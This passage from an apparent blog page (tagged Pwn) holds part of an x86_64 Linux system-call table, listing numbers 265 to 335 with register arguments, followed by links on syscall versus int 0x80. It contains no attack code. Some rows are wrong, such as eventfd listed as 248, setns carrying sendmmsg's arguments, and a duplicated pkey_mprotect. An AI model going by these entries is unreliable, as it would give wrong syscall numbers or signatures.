data-label="rsi">int newfd</td>      <td data-label="rdx">const char* newname</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">267</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/readlinkat" target="_blank">          sys_readlinkat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* pathname</td>      <td data-label="rdx">char* buf</td>      <td data-label="r10">int bufsiz</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">268</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fchmodat" target="_blank">          sys_fchmodat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">mode_t mode</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">269</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/faccessat" target="_blank">          sys_faccessat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">int mode</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">270</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/pselect6" target="_blank">          sys_pselect6        </a>      </td>      <td data-label="rdi">int n</td>      <td data-label="rsi">fd_set* inp</td>      <td data-label="rdx">fd_set* outp</td>      <td data-label="r10">fd_set* exp</td>      <td data-label="r8">struct timespec* tsp</td>      <td data-label="r9">void* sig</td>    </tr>    <tr>      <th scope="row" data-label="rax">271</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/ppoll" target="_blank">          sys_ppoll        </a>      </td>      <td data-label="rdi">struct pollfd* ufds</td>      <td data-label="rsi">unsigned int nfds</td>      <td data-label="rdx">struct timespec* tsp</td>      <td data-label="r10">const sigset_t* sigmask</td>      <td data-label="r8">size_t sigsetsize</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">272</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/unshare" target="_blank">          sys_unshare        </a>      </td>      <td data-label="rdi">unsigned long unshare_flags</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">273</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/set_robust_list" target="_blank">          sys_set_robust_list        </a>      </td>      <td data-label="rdi">struct robust_list_head* head</td>      <td data-label="rsi">size_t len</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">274</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/get_robust_list" target="_blank">          sys_get_robust_list        </a>      </td>      <td data-label="rdi">int pid</td>      <td data-label="rsi">struct robust_list_head** head_ptr</td>      <td data-label="rdx">size_t* len_ptr</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">275</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/splice" target="_blank">          sys_splice        </a>      </td>      <td data-label="rdi">int fd_in</td>      <td data-label="rsi">off_t* off_in</td>      <td data-label="rdx">int fd_out</td>      <td data-label="r10">off_t* off_out</td>      <td data-label="r8">size_t len</td>      <td data-label="r9">unsigned int flags</td>    </tr>    <tr>      <th scope="row" data-label="rax">276</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/tee" target="_blank">          sys_tee        </a>      </td>      <td data-label="rdi">int fdin</td>      <td data-label="rsi">int fdout</td>      <td data-label="rdx">size_t len</td>      <td data-label="r10">unsigned int flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">277</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sync_file_range" target="_blank">          sys_sync_file_range        </a>      </td>      <td data-label="rdi">long fd</td>      <td data-label="rsi">off_t offset</td>      <td data-label="rdx">off_t bytes</td>      <td data-label="r10">long flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">278</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/vmsplice" target="_blank">          sys_vmsplice        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">const struct iovec* iov</td>      <td data-label="rdx">unsigned long nr_segs</td>      <td data-label="r10">unsigned int flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">279</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/move_pages" target="_blank">          sys_move_pages        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">unsigned long nr_pages</td>      <td data-label="rdx">const void** pages</td>      <td data-label="r10">const int* nodes</td>      <td data-label="r8">int* status</td>      <td data-label="r9">int flags</td>    </tr>    <tr>      <th scope="row" data-label="rax">280</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/utimensat" target="_blank">          sys_utimensat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">struct timespec* utimes</td>      <td data-label="r10">int flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">281</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/epoll_wait" target="_blank">          sys_epoll_wait        </a>      </td>      <td data-label="rdi">int epfd</td>      <td data-label="rsi">struct epoll_event* events</td>      <td data-label="rdx">int maxevents</td>      <td data-label="r10">int timeout</td>      <td data-label="r8">const sigset_t* sigmask</td>      <td data-label="r9">size_t sigsetsize</td>    </tr>    <tr>      <th scope="row" data-label="rax">282</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/signalfd" target="_blank">          sys_signalfd        </a>      </td>      <td data-label="rdi">int ufd</td>      <td data-label="rsi">sigset_t* user_mask</td>      <td data-label="rdx">size_t sizemask</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">283</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/timerfd_create" target="_blank">          sys_timerfd_create        </a>      </td>      <td data-label="rdi">int clockid</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">248</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/eventfd" target="_blank">          sys_eventfd        </a>      </td>      <td data-label="rdi">unsigned int count</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">285</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fallocate" target="_blank">          sys_fallocate        </a>      </td>      <td data-label="rdi">long fd</td>      <td data-label="rsi">long mode</td>      <td data-label="rdx">off_t offset</td>      <td data-label="r10">off_t len</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">286</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/timerfd_settime" target="_blank">          sys_timerfd_settime        </a>      </td>      <td data-label="rdi">int ufd</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx">const struct itimerspec* utmr</td>      <td data-label="r10">struct itimerspec* otmr</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">287</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/timerfd_gettime" target="_blank">          sys_timerfd_gettime        </a>      </td>      <td data-label="rdi">int ufd</td>      <td data-label="rsi">struct itimerspec* otmr</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">288</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/accept4" target="_blank">          sys_accept4        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct sockaddr* upeer_sockaddr</td>      <td data-label="rdx">int* upeer_addrlen</td>      <td data-label="r10">int flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">289</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/signalfd4" target="_blank">          sys_signalfd4        </a>      </td>      <td data-label="rdi">int ufd</td>      <td data-label="rsi">sigset_t* user_mask</td>      <td data-label="rdx">size_t sizemask</td>      <td data-label="r10">int flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">290</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/eventfd2" target="_blank">          sys_eventfd2        </a>      </td>      <td data-label="rdi">unsigned int count</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">291</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/epoll_create1" target="_blank">          sys_epoll_create1        </a>      </td>      <td data-label="rdi">int flags</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">292</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/dup3" target="_blank">          sys_dup3        </a>      </td>      <td data-label="rdi">unsigned int oldfd</td>      <td data-label="rsi">unsigned int newfd</td>      <td data-label="rdx">int flags</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">293</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/pipe2" target="_blank">          sys_pipe2        </a>      </td>      <td data-label="rdi">int* filedes</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">294</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/inotify_init1" target="_blank">          sys_inotify_init1        </a>      </td>      <td data-label="rdi">int flags</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">295</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/preadv" target="_blank">          sys_preadv        </a>      </td>      <td data-label="rdi">unsigned long fd</td>      <td data-label="rsi">const struct iovec* vec</td>      <td data-label="rdx">unsigned long vlen</td>      <td data-label="r10">unsigned long pos_l</td>      <td data-label="r8">unsigned long pos_h</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">296</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/pwritev" target="_blank">          sys_pwritev        </a>      </td>      <td data-label="rdi">unsigned long fd</td>      <td data-label="rsi">const struct iovec* vec</td>      <td data-label="rdx">unsigned long vlen</td>      <td data-label="r10">unsigned long pos_l</td>      <td data-label="r8">unsigned long pos_h</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">297</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rt_tgsigqueueinfo" target="_blank">          sys_rt_tgsigqueueinfo        </a>      </td>      <td data-label="rdi">pid_t tgid</td>      <td data-label="rsi">pid_t pid</td>      <td data-label="rdx">int sig</td>      <td data-label="r10">siginfo_t* uinfo</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">298</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/perf_event_open" target="_blank">          sys_perf_event_open        </a>      </td>      <td data-label="rdi">struct perf_event_attr* attr_uptr</td>      <td data-label="rsi">pid_t pid</td>      <td data-label="rdx">int cpu</td>      <td data-label="r10">int group_fd</td>      <td data-label="r8">unsigned long flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">299</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/recvmmsg" target="_blank">          sys_recvmmsg        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct msghdr* mmsg</td>      <td data-label="rdx">unsigned int vlen</td>      <td data-label="r10">unsigned int flags</td>      <td data-label="r8">struct timespec* timeout</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">300</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_fanotify_init        </a>      </td>      <td data-label="rdi">unsigned int flags</td>      <td data-label="rsi">unsigned int event_f_flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">301</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_fanotify_mark        </a>      </td>      <td data-label="rdi">long fanotify_fd</td>      <td data-label="rsi">long flags</td>      <td data-label="rdx">__u64 mask</td>      <td data-label="r10">long dfd</td>      <td data-label="r8">long pathname</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">302</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_prlimit64        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">unsigned int resource</td>      <td data-label="rdx">const struct rlimit64* new_rlim</td>      <td data-label="r10">struct rlimit64* old_rlim</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">303</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_name_to_handle_at        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx">struct file_handle* handle</td>      <td data-label="r10">int *mnt_id</td>      <td data-label="r8">int flag</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">304</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_open_by_handle_at        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* name</td>      <td data-label="rdx">struct file_handle* handle</td>      <td data-label="r10">int *mnt_id</td>      <td data-label="r8">int flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">305</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_clock_adjtime        </a>      </td>      <td data-label="rdi">clockid_t which_clock</td>      <td data-label="rsi">struct time* tx</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">306</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/syncfs" target="_blank">          sys_syncfs        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">307</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sendmmsg" target="_blank">          sys_sendmmsg        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct mmsghdr* mmsg</td>      <td data-label="rdx">unsigned int vlen</td>      <td data-label="r10">unsigned int flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">308</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setns" target="_blank">          sys_setns        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct mmsghdr* mmsg</td>      <td data-label="rdx">unsigned int vlen</td>      <td data-label="r10">unsigned int flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">309</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getcpu" target="_blank">          sys_getcpu        </a>      </td>      <td data-label="rdi">unsigned* cpup</td>      <td data-label="rsi">unsigned* nodep</td>      <td data-label="rdx">struct getcpu_cache* unused</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">310</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/process_vm_readv" target="_blank">          sys_process_vm_readv        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">const struc iovec* lvec</td>      <td data-label="rdx">unsigned long liovcnt</td>      <td data-label="r10">const struct iovec* rvec</td>      <td data-label="r8">unsigned long riovcnt</td>      <td data-label="r9">unsigned long flags</td>    </tr>    <tr>      <th scope="row" data-label="rax">311</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/process_vm_writev" target="_blank">          sys_process_vm_writev        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">const struct iovec* lvec</td>      <td data-label="rdx">unsigned long liovcnt</td>      <td data-label="r10">const struct iovcc* rvec</td>      <td data-label="r8">unsigned long riovcnt</td>      <td data-label="r9">unsigned long flags</td>    </tr>    <tr>      <th scope="row" data-label="rax">312</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/kcmp" target="_blank">          sys_kcmp        </a>      </td>      <td data-label="rdi">pid_t pid1</td>      <td data-label="rsi">pid_t pid2</td>      <td data-label="rdx">int type</td>      <td data-label="r10">unsigned long idx1</td>      <td data-label="r8">unsigned long idx2</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">313</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/finit_module" target="_blank">          sys_finit_module        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">const char* param_values</td>      <td data-label="rdx">int flags</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">314</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_sched_setattr        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">struct sched_attr* attr</td>      <td data-label="rdx">unsigned int flags</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">315</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_sched_getattr        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">struct sched_attr* attr</td>      <td data-label="rdx">unsigned int size</td>      <td data-label="r10">unsigned int flags</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">316</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_renameat2        </a>      </td>      <td data-label="rdi">int olddfd</td>      <td data-label="rsi">const char* oldname</td>      <td data-label="rdx">int newdfd</td>      <td data-label="r10">const char* newname</td>      <td data-label="r8">unsigned int flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">317</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_seccomp        </a>      </td>      <td data-label="rdi">unsigned int op</td>      <td data-label="rsi">unsigned int flags</td>      <td data-label="rdx">const char *uargs</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">318</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_getrandom        </a>      </td>      <td data-label="rdi">char* buf</td>      <td data-label="rsi">size_t count</td>      <td data-label="rdx">unsigned int flags</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">319</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_memfd_create        </a>      </td>      <td data-label="rdi">const char* uname_ptr</td>      <td data-label="rsi">unsigned int flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">320</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_kexec_file_load        </a>      </td>      <td data-label="rdi">int kernel_fd</td>      <td data-label="rsi">int initrd_fd</td>      <td data-label="rdx">unsigned long cmdline_len</td>      <td data-label="r10">const char* cmdline_ptr</td>      <td data-label="r8">unsigned long flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">321</th>      <td data-label="System Call">        <a href="#" target="_blank">          sys_bpf        </a>      </td>      <td data-label="rdi">int cmd</td>      <td data-label="rsi">union bpf_attr* attr</td>      <td data-label="rdx">unsigned int size</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">322</th>      <td data-label="System Call">        <a href="#" target="_blank">          stub_execveat        </a>      </td>      <td data-label="rdi">int dfd</td>      <td data-label="rsi">const char* filename</td>      <td data-label="rdx">const char* argv</td>      <td data-label="r10">const char* envp</td>      <td data-label="r8">int flags</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">323</th>      <td data-label="System Call">        <a href="#" target="_blank">          userfaultfd        </a>      </td>      <td data-label="rdi">int flags</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">324</th>      <td data-label="System Call">        <a href="#" target="_blank">          membarrier        </a>      </td>      <td data-label="rdi">int cmd</td>      <td data-label="rsi">int flags</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">325</th>      <td data-label="System Call">        <a href="#" target="_blank">          mlock2        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">size_t len</td>      <td data-label="rdx">int flags</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">326</th>      <td data-label="System Call">        <a href="#" target="_blank">          copy_file_range        </a>      </td>      <td data-label="rdi">int fd_in</td>      <td data-label="rsi">off_t* off_in</td>      <td data-label="rdx">int fd_out</td>      <td data-label="r10">off_t* off_out</td>      <td data-label="r8">size_t len</td>      <td data-label="r9">unsigned int flags</td>    </tr>    <tr>      <th scope="row" data-label="rax">327</th>      <td data-label="System Call">        <a href="#" target="_blank">          preadb2        </a>      </td>      <td data-label="rdi">unsigned long fd</td>      <td data-label="rsi">const struct iovec* vec</td>      <td data-label="rdx">unsigned long vlen</td>      <td data-label="r10">unsigned long pos_l</td>      <td data-label="r8">unsigned long pos_h</td>      <td data-label="r9">int flags</td>    </tr>    <tr>      <th scope="row" data-label="rax">328</th>      <td data-label="System Call">        <a href="#" target="_blank">          pwritev2        </a>      </td>      <td data-label="rdi">unsigned long fd</td>      <td data-label="rsi">const struct iovec* vec</td>      <td data-label="rdx">unsigned long vlen</td>      <td data-label="r10">unsigned long pos_l</td>      <td data-label="r8">unsigned long pos_h</td>      <td data-label="r9">int flags</td>    </tr>    <tr>      <th scope="row" data-label="rax">329</th>      <td data-label="System Call">        <a href="#" target="_blank">          pkey_mprotect        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">330</th>      <td data-label="System Call">        <a href="#" target="_blank">          pkey_alloc        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">331</th>      <td data-label="System Call">        <a href="#" target="_blank">          pkey_free        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">332</th>      <td data-label="System Call">        <a href="#" target="_blank">          statx        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">333</th>      <td data-label="System Call">        <a href="#" target="_blank">          io_pgetevents        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">334</th>      <td data-label="System Call">        <a href="#" target="_blank">          rseq        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">335</th>      <td data-label="System Call">        <a href="#" target="_blank">          pkey_mprotect        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>  </tbody></table><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/bjbz_cxy/article/details/140602272">linux syscall和int 80的区别</a><br><a href="https://www.bytezonex.com/archives/kCMSUXpw.html">32 位 Linux 代码中“int 0x80”与“syscall”：系统调用方法解析</a><br><a href="https://blog.csdn.net/qq_41202237/article/details/107249667">Linux32位系统调用号——奇偶排列表格方便查找</a><br><a href="https://blog.csdn.net/qq_41202237/article/details/107250349">Linux64位系统调用号——奇偶排列表格方便查找</a><br><a href="https://hackeradam.com/x86-64-linux-syscalls/">x86_64 LInux Syscall Reference | Adam Hacks</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
